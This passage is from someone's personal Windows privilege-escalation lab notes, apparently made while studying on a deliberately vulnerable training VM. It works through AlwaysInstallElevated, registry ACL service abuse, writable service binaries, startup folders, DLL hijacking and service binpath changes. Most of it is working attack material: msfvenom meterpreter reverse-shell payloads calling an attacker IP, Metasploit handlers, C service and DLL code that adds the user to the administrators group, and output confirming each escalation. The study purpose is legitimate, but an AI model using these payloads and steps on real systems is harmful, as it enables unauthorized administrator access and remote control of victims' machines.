		AlwaysInstallElevated    REG_DWORD    0x1											# double checking 1 is on, and it is.
4.From the output, notice that “AlwaysInstallElevated” value is 1.


[*] Checking for AlwaysInstallElevated registry key...										# referring back to powershell -ep bypass results on line 1369


AbuseFunction : Write-UserAddMSI


PS C:\Users\user\Desktop\Tools\PowerUp> Write-UserAddMSI									#literally just run the abuse function and it creates a .msi

OutputPath
----------
UserAdd.msi
PS C:\Users\user\Desktop\Tools\PowerUp>

C:\Users\user>net localgroup administrators													# checking net localgroup administrators group before
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the compu
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
The command completed successfully.


C:\Users\user>

C:\Users\user\Desktop\Tools\PowerUp													# go back to power up folder and notice UserAdd has been put in here
# once it pops up we are able to add username/password/ and group association


C:\Users\user>net localgroup administrators											# new administrator group results.
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the comp
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
backdoor
TCM
The command completed successfully.

/\/\\/\/\/\/\/\/\/\/\/\/\	AlwaysInstallElevated Overview and Escalation (METERPRETER METHOD TO ABUSE) /\/\\/\/\/\/\/\/\/\/\/\/\	

msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.13.125 lport=4444 -f msi -o setup.msi 			#meterpreter method to abuse

navigate to msfvenom -p windows/meterpreter/reverse_tcp lhost=10.13.13.125 lport=4444 -f msi -o setup.msi  # download setup.msi and go back to msfconsole on kali box

meterpreter > getuid																						# rootedbaby	if attempting this as low level user continue on			
Server username: NT AUTHORITY\SYSTEM
meterpreter > 

meterpreter > background
[*] Backgrounding session 2...																				# low level user guidance.
msf6 exploit(multi/handler) > use exploit/windows/local/always_install_elevated
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > options

Module options (exploit/windows/local/always_install_elevated):

   Name     Current Setting  Required  Description
   ----     ---------------  --------  -----------
   SESSION                   yes       The session to run this module on


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.128.129  yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows


msf6 exploit(windows/local/always_install_elevated) > 

/\/\\/\/\/\/\/\/\/\/\/\/\	Overview of regsvc ACL ( service escalation dealing with the registry )/\/\\/\/\/\/\/\/\/\/\/\/\

++++++++++++++++++++++++++++Detection++

Windows VM

1. Open powershell prompt and type: Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc | fl
2. Notice that the output suggests that user belong to “NT AUTHORITY\INTERACTIVE” has “FullContol” permission over the registry key.

Microsoft Windows [Version 6.1.7601]													#example start
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>powershell -ep bypass
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user> Get-Acl -Path hklm:\System\CurrentControlSet\services\regsvc
 fl


Path   : Microsoft.PowerShell.Core\Registry::HKEY_LOCAL_MACHINE\System\CurrentC
         ontrolSet\services\regsvc
Owner  : BUILTIN\Administrators
Group  : NT AUTHORITY\SYSTEM
Access : Everyone Allow  ReadKey
         NT AUTHORITY\INTERACTIVE Allow  FullControl								# this is us, so we have full control authority access
         NT AUTHORITY\SYSTEM Allow  FullControl
         BUILTIN\Administrators Allow  FullControl
Audit  :
Sddl   : O:BAG:SYD:P(A;CI;KR;;;WD)(A;CI;KA;;;IU)(A;CI;KA;;;SY)(A;CI;KA;;;BA)

++++++++++++++++++++++++Exploitation+++++++++++++++++++++++

Windows VM

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_service.c’ to the Kali VM.

Kali VM

1. Open windows_service.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_service.c -o x.exe (NOTE: if this is not installed, use 'sudo apt install gcc-mingw-w64') 
3. Copy the generated file x.exe, to the Windows VM.

Windows VM

1. Place x.exe in ‘C:\Temp’.
2. Open command prompt at type: reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f
3. In the command prompt type: sc start regsvc
4. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators

┌──(root㉿kali)-[/home/kali/Documents/transfer]							# pyftpdlib download
└─# pip install pyftpdlib

┌──(root㉿kali)-[/home/kali/Documents/transfer]								# hosting ftp server on kali machine to bring over file from windows vm
└─# python -m pyftpdlib -p 21 --write
/usr/local/lib/python3.10/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2023-01-19 23:30:26] concurrency model: async
[I 2023-01-19 23:30:26] masquerade (NAT) address: None
[I 2023-01-19 23:30:26] passive ports: None
[I 2023-01-19 23:30:26] >>> starting FTP server on 0.0.0.0:21, pid=57596 <<<



C:\Users\user\Desktop\Tools\Source>ftp 10.13.13.125							# from windows machine xferring windows_service.c to linux box.
Connected to 10.13.13.125.
220 pyftpdlib 1.5.7 ready.
User (10.13.13.125:(none)): anonymous
331 Username ok, send password.
Password:
230 Login successful.
ftp> put windows_service.c
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp: 2043 bytes sent in 0.21Seconds 9.82Kbytes/sec.
ftp>


┌──(root㉿kali)-[/home/kali/Documents/transfer]								# file is now on kali machine.
└─# ls -la | grep windows_      
-rw-r--r-- 1 root root   2043 Jan 19 23:32 windows_service.c

┌──(root㉿kali)-[/home/kali/Documents/transfer]								#editing section of c script that is running as system to do something else
└─# gedit windows_service.c            

//add the payload here														# portion of script function being edited
int Run() 
{ 
    system("whoami > c:\\windows\\temp\\service.txt");
    return 0; 
}

//add the payload here														# edited system function.
int Run() 
{ 
    system("cmd.exe /k net localgroup administrators user /add");
    return 0; 
} 

┌──(root㉿kali)-[/home/kali/Documents/transfer]								# running command to get compiler for win64
└─# apt-get install gcc-mingw-w64


┌──(root㉿kali)-[/home/kali/Documents/transfer]								# command running to compile windows_service.c
└─# x86_64-w64-mingw32-gcc windows_service.c -o x.exe

┌──(root㉿kali)-[/home/kali/Documents/transfer]								# ensuring the x.exe is created.
└─# ls | grep x.exe
x.exe
	
┌──(root㉿kali)-[/home/kali/Documents/transfer]								# setting up http server to put file in temp folderrs on windows vm
└─# python3 -m http.server           
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


C:\Temp																		#x.exe saved in this location on windows box.


C:\Users\user\Desktop\Tools\Source>reg add HKLM\SYSTEM\CurrentControlSet\service		#adding to registry, adding to regsvc, /v = what registry entry do i want added to this sub key? (imagepath = a reg key that contains path of registry image file), runs 
s\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f                              # executable for us, /t=type going to run a string value here=reg_expand_sz /f= dont prompt me for this i just want it to execute.
The operation completed successfully.


C:\Users\user\Desktop\Tools\Source>sc start regsvc										# ran svc and now check out admin group

SERVICE_NAME: regsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2600
        FLAGS              :

PS C:\Users\user> net localgroup administrators											
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the comp
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
backdoor
TCM
user																				# now user is added to group
The command completed successfully.

#WHAT HAPPENED?
Saw that ACl showed that the INTERACTIVE had full controll over regkey, that means that we are able to generate a malicious .exe and use the executable under the image path (reg add HKLM\SYSTEM\CurrentControlSet\services\regsvc /v ImagePath /t REG_EXPAND_SZ /d c:\temp\x.exe /f) and the image path allowed us to execute file when we started th service, adding user to the local admin group.


 ###########################################################################################################	Escalation  path: Executable Files	###########################################################################################################		Powerup
+++++++++++++++++++Detection+++++++++++++++++++

Windows VM

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Program Files\File Permissions Service"
2. Notice that the “Everyone” user group has “FILE_ALL_ACCESS” permission on the filepermservice.exe file.

+++++++++++++++++++Exploitation+++++++++++++++++++

Windows VM

1. Open command prompt and type: copy /y c:\Temp\x.exe "c:\Program Files\File Permissions Service\filepermservice.exe"
2. In command prompt type: sc start filepermsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators



C:\Users\user\Desktop\Tools\PowerUp>powershell -ep bypass											# running powerup in tools folder on windows machine.
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user\Desktop\Tools\PowerUp> . .\Powerup.ps1
PS C:\Users\user\Desktop\Tools\PowerUp> Invoke-AllChecks

[*] Running Invoke-AllChecks


[*] Checking if user is in a local group with administrative privileges...


[*] Checking for unquoted service paths...


ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;
                 IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False

ServiceName    : AWSLiteAgent
Path           : C:\Program Files\Amazon\XenTools\LiteAgent.exe
ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityRef
                 erence=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'AWSLiteAgent' -Path <HijackPath>
CanRestart     : False

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpa
                 thservice.exe
ModifiablePath : @{Permissions=AppendData/AddSubdirectory; ModifiablePath=C:\;
                 IdentityReference=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
CanRestart     : True

ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpa
                 thservice.exe
ModifiablePath : @{Permissions=System.Object[]; ModifiablePath=C:\; IdentityRef
                 erence=NT AUTHORITY\Authenticated Users}
StartName      : LocalSystem
AbuseFunction  : Write-ServiceBinary -Name 'unquotedsvc' -Path <HijackPath>
CanRestart     : True

[*] Checking service executable and argument permissions...

ServiceName                     : filepermsvc													######## found this for us
Path                            : "C:\Program Files\File Permissions Service\fi
                                  lepermservice.exe"
ModifiableFile                  : C:\Program Files\File Permissions Service\fil					####
                                  epermservice.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Travers					###
                                  e, DeleteChild...}
ModifiableFileIdentityReference : Everyone														# as everyone can execute
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'filepermsvc'
CanRestart                      : True

ServiceName                     : regsvc
Path                            : c:\temp\x.exe
ModifiableFile                  : C:\temp\x.exe
ModifiableFilePermissions       : {ReadAttributes, ReadControl, Execute/Travers
                                  e, WriteAttributes...}
ModifiableFileIdentityReference : NT AUTHORITY\Authenticated Users
StartName                       : LocalSystem
AbuseFunction                   : Install-ServiceBinary -Name 'regsvc'
CanRestart                      : True

[*] Checking service permissions...


ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'
CanRestart    : True

[*] Checking %PATH% for potentially hijackable DLL locations...

Permissions       : {ReadAttributes, ReadControl, Execute/Traverse, WriteAttrib
                    utes...}
ModifiablePath    : C:\Temp
IdentityReference : NT AUTHORITY\Authenticated Users
%PATH%            : C:\Temp
AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'

Permissions       : {GenericWrite, Delete, GenericExecute, GenericRead}
ModifiablePath    : C:\Temp
IdentityReference : NT AUTHORITY\Authenticated Users
%PATH%            : C:\Temp
AbuseFunction     : Write-HijackDll -DllPath 'C:\Temp\wlbsctrl.dll'

[*] Checking for AlwaysInstallElevated registry key...


AbuseFunction : Write-UserAddMSI

[*] Checking for Autologon credentials in registry...


[*] Checking for modifidable registry autoruns and configs...


Key            : HKLM:\SOFTWARE\Microsoft\Windows\CurrentVersion\Run\My Program
Path           : "C:\Program Files\Autorun Program\program.exe"
ModifiableFile : @{Permissions=System.Object[]; ModifiablePath=C:\Program Files
                 \Autorun Program\program.exe; IdentityReference=Everyone}

[*] Checking for modifiable schtask files/configs...


[*] Checking for unattended install files...


UnattendPath : C:\Windows\Panther\Unattend.xml

[*] Checking for encrypted web.config strings...


[*] Checking for encrypted application pool and virtual directory passwords...


[*] Checking for plaintext passwords in McAfee SiteList.xml files....

[*] Checking for cached Group Policy Preferences .xml files....


PS C:\Users\user\Desktop\Tools\PowerUp>



Microsoft Windows [Version 6.1.7601]																
Copyright (c) 2009 Microsoft Corporation.  All rights reserved.

C:\Users\user>C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wvu "C:\Pro
gram Files\File Permissions Service"

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

C:\Program Files\File Permissions Service\filepermservice.exe
  Medium Mandatory Level (Default) [No-Write-Up]
  RW Everyone
        FILE_ALL_ACCESS																		# notable
  RW NT AUTHORITY\SYSTEM
        FILE_ALL_ACCESS
  RW BUILTIN\Administrators
        FILE_ALL_ACCESS



Running x.exe again from previous section, ctrl-f x.exe to refer to hosting http server to get onto windows machine.
# putting x.exe in location of C:\Program Files\File Permissions Service\filepermservice.exe to replace this file.


C:\Users\user>net localgroup administrators																	# checking to see which administrators exist.
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the compu
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
The command completed successfully.


C:\Users\user>


C:\Users\user>sc start filepermsvc																			# starting service

SERVICE_NAME: filepermsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 2244
        FLAGS              :

C:\Users\user>


Members																		# user has been successfully escalated into administrator group

--------------------------------------
Administrator
TCM
user
The command completed successfully.


C:\Users\user>

 #####################################################################################################	Escalation  path: Startup Applications 		###########################################################################################################	


/\/\\/\/\/\/\/\/\/\/\/\/\	STARTUP APPLICATIONS OVERVIEW /\/\\/\/\/\/\/\/\/\/\/\/\

+++++++++++++++	Detection	+++++++++++++++

Windows VM

1. Open command prompt and type: icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup" 											# looks at permissions of acls and see if we have access
2. From the output notice that the “BUILTIN\Users” group has full access ‘(F)’ to the directory.

+++++++++++++++	Exploitation	+++++++++++++++

Kali VM

1. Open command prompt and type: msfconsole
2. In Metasploit (msf > prompt) type: use multi/handler
3. In Metasploit (msf > prompt) type: set payload windows/meterpreter/reverse_tcp
4. In Metasploit (msf > prompt) type: set lhost [Kali VM IP Address]
5. In Metasploit (msf > prompt) type: run
6. Open another command prompt and type: msfvenom -p windows/meterpreter/reverse_tcp LHOST=[Kali VM IP Address] -f exe -o y.exe
7. Copy the generated file, y.exe, to the Windows VM.

Windows VM

1. Place x.exe in “C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup”.
2. Logoff.
3. Login with the administrator account credentials.

Kali VM

1. Wait for a session to be created, it may take a few seconds.
2. In Meterpreter(meterpreter > prompt) type: getuid
3. From the output, notice the user is “User-PC\Admin”




C:\Users\user>icacls.exe "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup"
C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup BUILTIN\Users:(F)									# f here means we have full controls as the user 
                                                             TCM-PC\TCM:(I)(OI)(								#https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/icacls to check remarks meaning
CI)(DE,DC)
                                                             NT AUTHORITY\SYSTEM
:(I)(OI)(CI)(F)
                                                             BUILTIN\Administrat
ors:(I)(OI)(CI)(F)
                                                             BUILTIN\Users:(I)(O
I)(CI)(RX)
                                                             Everyone:(I)(OI)(CI
)(RX)

Successfully processed 1 files; Failed processing 0 files


/\/\\/\/\/\/\/\/\/\/\/\/\	ESCALATION VIA STARTUP APPLICATIONS /\/\\/\/\/\/\/\/\/\/\/\/\

msf6 > use exploit/windows/local/always_install_elevated 
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf6 exploit(windows/local/always_install_elevated) > use multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/meterpreter/reverse_tcp
payload => windows/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lhost 10.13.13.125
lhost => 10.13.13.125
msf6 exploit(multi/handler) > set lport 4444
lport => 4444
msf6 exploit(multi/handler) > show options

Module options (exploit/multi/handler):

   Name  Current Setting  Required  Description
   ----  ---------------  --------  -----------


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  process          yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     10.13.13.125     yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Wildcard Target


msf6 exploit(multi/handler) > 

msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.13.13.125 LPORT=4444 -f exe -o y.exe		# getting new shell code

┌──(root㉿kali)-[/home/kali/Documents/transfer]													# setting up http server.
└─# python3 -m http.server                                                                   
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


get y.exe off http://10.13.13.125:8000/															# pulling y.exe shell code onto victim box.

drop y.exe into C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup path 				#Have to type out ProgramData, this is hidden.

RUN THE MULTI/HANDLER FROM BEFORE 

disconnect from victim machine, start another rdesktop up back to victim box and login as TCM:Hacker123

meterpreter > getuid																			# WE WIN. WE ARE TCM WHICH IS IN ADMIN GROUP.
Server username: TCM-PC\TCM
meterpreter > 

# PROBABLY WILL NOT HAPPEN ON AN EXAM BUT GOOD TO CHECK AS A LAST REPORT - THIS IS NICHE.


 #####################################################################################################	Escalation  Path: DLL hijacking	###########################################################################################################	


/\/\\/\/\/\/\/\/\/\/\/\/\	Overview and Escalation via DLL Hijacking /\/\\/\/\/\/\/\/\/\/\/\/\



++++++++++++++++++	Detection	++++++++++++++++++

Windows VM

1. Open the Tools folder that is located on the desktop and then go the Process Monitor folder.
2. In reality, executables would be copied from the victim’s host over to the attacker’s host for analysis during run time. Alternatively, the same software can be installed on the attacker’s host for analysis, in case they can obtain it. To simulate this, right click on Procmon.exe and select ‘Run as administrator’ from the menu.
3. In procmon, select "filter".  From the left-most drop down menu, select ‘Process Name’.
4. In the input box on the same line type: dllhijackservice.exe
5. Make sure the line reads “Process Name is dllhijackservice.exe then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
6. Next, select from the left-most drop down menu ‘Result’.
7. In the input box on the same line type: NAME NOT FOUND
8. Make sure the line reads “Result is NAME NOT FOUND then Include” and click on the ‘Add’ button, then ‘Apply’ and lastly on ‘OK’.
9. Open command prompt and type: sc start dllsvc
10. Scroll to the bottom of the window. One of the highlighted results shows that the service tried to execute ‘C:\Temp\hijackme.dll’ yet it could not do that as the file was not found. Note that ‘C:\Temp’ is a writable location.

++++++++++++++++++	Exploitation	++++++++++++++++++

Windows VM

1. Copy ‘C:\Users\User\Desktop\Tools\Source\windows_dll.c’ to the Kali VM.

Kali VM

1. Open windows_dll.c in a text editor and replace the command used by the system() function to: cmd.exe /k net localgroup administrators user /add
2. Exit the text editor and compile the file by typing the following in the command prompt: x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll
3. Copy the generated file hijackme.dll, to the Windows VM.

Windows VM

1. Place hijackme.dll in ‘C:\Temp’.
2. Open command prompt and type: sc stop dllsvc & sc start dllsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators


┌──(root㉿kali)-[/home/kali/Documents/transfer]														# setting up ftp server on kali box
└─# python -m pyftpdlib -p 21 --write
/usr/local/lib/python3.10/dist-packages/pyftpdlib/authorizers.py:243: RuntimeWarning: write permissions assigned to anonymous user.
  warnings.warn("write permissions assigned to anonymous user.",
[I 2023-01-20 20:23:07] concurrency model: async
[I 2023-01-20 20:23:07] masquerade (NAT) address: None
[I 2023-01-20 20:23:07] passive ports: None
[I 2023-01-20 20:23:07] >>> starting FTP server on 0.0.0.0:21, pid=13465 <<<
[I 2023-01-20 20:23:31] 10.10.103.83:49199-[] FTP session opened (connect)
[I 2023-01-20 20:23:36] 10.10.103.83:49199-[anonymous] USER 'anonymous' logged in.
[I 2023-01-20 20:23:52] 10.10.103.83:49199-[anonymous] STOR /home/kali/Documents/transfer/windows_dll.c completed=1 bytes=417 seconds=0.631


C:\Users\user\Desktop\Tools\Source>ftp 10.13.13.125													# xrfering windows_dll.c to kali box to modify.
Connected to 10.13.13.125.
220 pyftpdlib 1.5.7 ready.
User (10.13.13.125:(none)): anonymous
331 Username ok, send password.
Password:
230 Login successful.
ftp> put windows_dll.c
200 Active data connection established.
125 Data connection already open. Transfer starting.
226 Transfer complete.
ftp: 417 bytes sent in 0.21Seconds 2.02Kbytes/sec.
ftp>

																					# showing that the file was successfully xferred.
┌──(root㉿kali)-[/home/kali/Documents/transfer]
└─# ls -la | grep windows_dll.c  
-rw-r--r-- 1 root root    417 Jan 20 20:23 windows_dll.c

┌──(root㉿kali)-[/home/kali/Documents/transfer]										# editing script with below text
└─# gedit windows_dll.c

// For x64 compile with: x86_64-w64-mingw32-gcc windows_dll.c -shared -o output.dll			#showing how to compile script once it is saved
// For x86 compile with: i686-w64-mingw32-gcc windows_dll.c -shared -o output.dll

#include <windows.h>
BOOL WINAPI DllMain (HANDLE hDll, DWORD dwReason, LPVOID lpReserved) {
    if (dwReason == DLL_PROCESS_ATTACH) {
        system("cmd.exe /k net localgroup administrators user /add");			
		# modified script to add "user" the user to the administrators group.
        ExitProcess(0);
    }
    return TRUE;
}

x86_64-w64-mingw32-gcc windows_dll.c -shared -o hijackme.dll		# compiling and renaming to dll service found in procmon that doesn't exist


┌──(root㉿kali)-[/home/kali/Documents/transfer]						# hosting http server in transfer folder to xfer back to victim windows box
└─# python3 -m http.server           
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...


C:\Users\user\Desktop\Tools\Source>net localgroup administrators	# checking net localgroup administrators before dll hijack.
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the compu
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
The command completed successfully.

http://10.13.13.125:8000/			# pulling hijackme.dll from internet explorer page and placing in location that it is going to in procmon, C:\Temp\hijackme.dll 

C:\Users\user\Desktop\Tools\Source>sc stop dllsvc & sc start dllsvc							# restarting the dllsvc or any service

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 1  STOPPED
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x0

SERVICE_NAME: dllsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        STATE              : 2  START_PENDING
                                (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
        WIN32_EXIT_CODE    : 0  (0x0)
        SERVICE_EXIT_CODE  : 0  (0x0)
        CHECKPOINT         : 0x0
        WAIT_HINT          : 0x7d0
        PID                : 3628
        FLAGS              :

C:\Users\user\Desktop\Tools\Source>net localgroup administrators
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the compu
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user																				# seeing that the modified code worked due to the location of directory being writable.
The command completed successfully.


C:\Users\user\Desktop\Tools\Source>

 #####################################################################################################	Escalation  Path: Service Permissions (Paths) ###########################################################################################################	

/\/\\/\/\/\/\/\/\/\/\/\/\	Escalation via Binary Paths /\/\\/\/\/\/\/\/\/\/\/\/\



++++++++++++++++++++	Detection	++++++++++++++++++++

Windows VM

1. Open command prompt and type: C:\Users\User\Desktop\Tools\Accesschk\accesschk64.exe -wuvc daclsvc

2. Notice that the output suggests that the user “User-PC\User” has the “SERVICE_CHANGE_CONFIG” permission.

++++++++++++++++++++	Exploitation 	++++++++++++++++++++

Windows VM

1. In command prompt type: sc config daclsvc binpath= "net localgroup administrators user /add"
2. In command prompt type: sc start daclsvc
3. It is possible to confirm that the user was added to the local administrators group by typing the following in the command prompt: net localgroup administrators




C:\Users\user\Desktop\Tools\PowerUp>powershell -ep bypass											# starting PowerUp tool, standard way to startup PowerUp
Windows PowerShell
Copyright (C) 2009 Microsoft Corporation. All rights reserved.

PS C:\Users\user\Desktop\Tools\PowerUp> . .\PowerUp.ps1
PS C:\Users\user\Desktop\Tools\PowerUp> Invoke-AllChecks

[*] Running Invoke-AllChecks

	#accesschk64.exe breakdown, -u= suppress the errors, -w= shows objects that have write acess, -c=displays service name for this, -v= verbose, everyone = as a group what can everyone do?

C:\Users\user\Desktop\Tools\Accesschk>accesschk64.exe -uwcv Everyone *

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

RW daclsvc												# have read/write for daclsvc
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\Users\user\Desktop\Tools\Accesschk>				


[*] Checking service permissions...											# also shows in powerup results, these are the powerup results from like 2203.


ServiceName   : daclsvc
Path          : "C:\Program Files\DACL Service\daclservice.exe"
StartName     : LocalSystem
AbuseFunction : Invoke-ServiceAbuse -Name 'daclsvc'							# can just straightup try this command.
CanRestart    : True														# being able to restart the service is big because we can control it if this is true.



C:\Users\user\Desktop\Tools\Accesschk>accesschk64.exe -wuvc daclsvc		# running accesschk against daclsvc.exe to get more information on the entirety of the settings.

Accesschk v6.10 - Reports effective permissions for securable objects
Copyright (C) 2006-2016 Mark Russinovich
Sysinternals - www.sysinternals.com

daclsvc
  Medium Mandatory Level (Default) [No-Write-Up]
  RW NT AUTHORITY\SYSTEM
        SERVICE_ALL_ACCESS
  RW BUILTIN\Administrators
        SERVICE_ALL_ACCESS
  RW Everyone
        SERVICE_QUERY_STATUS
        SERVICE_QUERY_CONFIG
        SERVICE_CHANGE_CONFIG
        SERVICE_INTERROGATE
        SERVICE_ENUMERATE_DEPENDENTS
        SERVICE_START
        SERVICE_STOP
        READ_CONTROL

C:\Users\user\Desktop\Tools\Accesschk>



C:\Users\user\Desktop\Tools\Accesschk>sc qc daclsvc								# querying the service.
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : "C:\Program Files\DACL Service\daclservice.exe"	# now have the path
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user\Desktop\Tools\Accesschk>



C:\Users\user\Desktop\Tools\Accesschk>sc config daclsvc binpath= "net localgroup administrators user /add"	#changing config of binpath, adding user to administrators
[SC] ChangeServiceConfig SUCCESS

C:\Users\user\Desktop\Tools\Accesschk>sc qc daclsvc
[SC] QueryServiceConfig SUCCESS

SERVICE_NAME: daclsvc
        TYPE               : 10  WIN32_OWN_PROCESS
        START_TYPE         : 3   DEMAND_START
        ERROR_CONTROL      : 1   NORMAL
        BINARY_PATH_NAME   : net localgroup administrators user /add							# checking to ensure it was changed, it was.
        LOAD_ORDER_GROUP   :
        TAG                : 0
        DISPLAY_NAME       : DACL Service
        DEPENDENCIES       :
        SERVICE_START_NAME : LocalSystem

C:\Users\user\Desktop\Tools\Accesschk>



C:\Users\user\Desktop\Tools\Accesschk>sc start daclsvc									# restarting service to enable the command input, going to get error bc theres nothing to restart.
[SC] StartService FAILED 1053:

The service did not respond to the start or control request in a timely fashion.



C:\Users\user\Desktop\Tools\Accesschk>net localgroup administrators						# checking if user is now in administrators, and we are.
Alias name     administrators
Comment        Administrators have complete and unrestricted access to the compu
ter/domain

Members

-------------------------------------------------------------------------------
Administrator
TCM
user
The command completed successfully.


/\/\\/\/\/\/\/\/\/\/\/\/\	Escalation via Unquoted Service Paths /\/\\/\/\/\/\/\/\/\/\/\/\

What is it? 
If you have a service executable that has a path that isnt enclosed in quotation marks and contains a space then you are going to have an issue

# if a path is unquoted then the way that the file is going to execute when looking for a file in example with the path below is by searching the directories in this order; Program.exe, Files.exe, Unquoted.exe, Path.exe, Service.exe, Common.exe, Files.exe, & finally unquotedpathsrvice.exe. If we are able to modify one of those Exe's then we can escalate.
ServiceName    : unquotedsvc
Path           : C:\Program Files\Unquoted Path Service\Common Files\unquotedpa
                 thservice.exe

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
